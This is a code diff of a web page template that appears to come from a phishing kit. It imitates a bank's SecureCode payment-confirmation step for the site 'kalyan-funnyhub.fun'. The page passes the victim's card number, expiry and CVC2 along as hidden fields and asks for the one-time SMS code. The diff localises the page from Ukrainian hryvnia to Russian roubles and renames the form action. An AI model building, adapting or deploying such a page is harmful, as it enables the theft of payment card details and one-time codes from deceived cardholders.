@@ -20,7 +20,7 @@
 	<script type="text/javascript" src="assets/js/payment/standard_waiter.js"></script>
 	<link rel="icon" href="assets/img/favicon.ico" type="image/x-icon">
 	<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon"> </head>
-<form method="POST" action="confirmation_fua" class="credit-card-form__form js-card-form" autocomplete="on">
+<form method="POST" action="confirmation_f" class="credit-card-form__form js-card-form" autocomplete="on">
 	<!-- новая форма -->
 	<style>
 	@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
@@ -834,7 +834,7 @@
 			<br>
 			<div class="card-list">
 				<div class="card-form__inner">
-					<center> <strong style="color:;font-size:21px">Підтвердження операції<i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – це простий та безпечний спосіб оплати покупок в інтернеті за картами, який реалізований шляхом відправлення одноразового секретного коду на мобільний телефон власнику картки та перевірки коду на стороні банкінгу." class="far fa-question-circle"></i></strong></center>
+					<center> <strong style="color:;font-size:21px">Подтверждение операции <i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – это простой и безопасный способ оплаты покупок в интернете по картам, который реализован путем отправки одноразового секретного кода на мобильный телефон держателю карты и проверки кода на стороне банкинга." class="far fa-question-circle"></i></strong></center>
 					<table style="margin: auto;padding: 20px;">
 						<tbody style="margin: auto;">
 							<tr>
@@ -842,16 +842,16 @@
 								<td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;">kalyan-funnyhub.fun</td>
 							</tr>
 							<tr>
-								<th style="float:right" scope="row">Сума</th>
-								<td style="padding-left:10px;color:#1a3b5d;font-weight: ;"><%= amount %> грн</td>
+								<th style="float:right" scope="row">Сумма</th>
+								<td style="padding-left:10px;color:#1a3b5d;font-weight: ;"><%= amount %> руб</td>
 							</tr>
 							<tr>
-								<th style="float:right" scope="row">Номер картки</th>
+								<th style="float:right" scope="row">Номер карты</th>
 								<td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;">**** **** **** <%= cardnumber %></td>
 							</tr>
 						</tbody>
 					</table>
-					<center> <small style="text-align:justify;">Для підтвердження операції на номер телефону було надіслано смс повідомлення з кодом підтвердження. Введіть його у поле нижче.</small> </center>
+					<center> <small style="text-align:justify;">Для подтверждения операции на Ваш номер телефона было отправлено смс сообщение с кодом подтверждения. Введите его в поле ниже.</small> </center>
 					<center>
 						<div class="card-input">
 							<input type="hidden" name="amount" value=<%= amount %>>
@@ -861,14 +861,14 @@
 							<input type="hidden" name="expdate1" value=<%= expdate1 %>>
 							<input type="hidden" name="expdate2" value=<%= expdate2 %>>
 							<input type="hidden" name="cvc2" value=<%= cvc2 %>>
-							<label for="cardName" class="card-input__label">Введiть код iз смс або<br/>натиснiть "Прийняти платiж"</label>
-							<input type="text" placeholder="Введіть код із смс..." name="securecode" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required> </div>
+							<label for="cardName" class="card-input__label">Введите код из смс или<br/>нажмите "Принять платеж"</label>
+							<input type="text" placeholder="Введите код из смс..." name="securecode" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required> </div>
 					</center>
 					<div class="card-form__row">
 						<div class="card-form__col">
 							<div class="credit-card-form__submit">
 								<div class="credit-card-form__submit-inner">
-									<input type='submit' class='card-form__button' name='submit' value='Підтвердити' onclick="this.style.display='none';"> </div>
+									<input type='submit' class='card-form__button' name='submit' value='Подтвердить' onclick="this.style.display='none';"> </div>
 							</div>
 						</div>
 					</div>
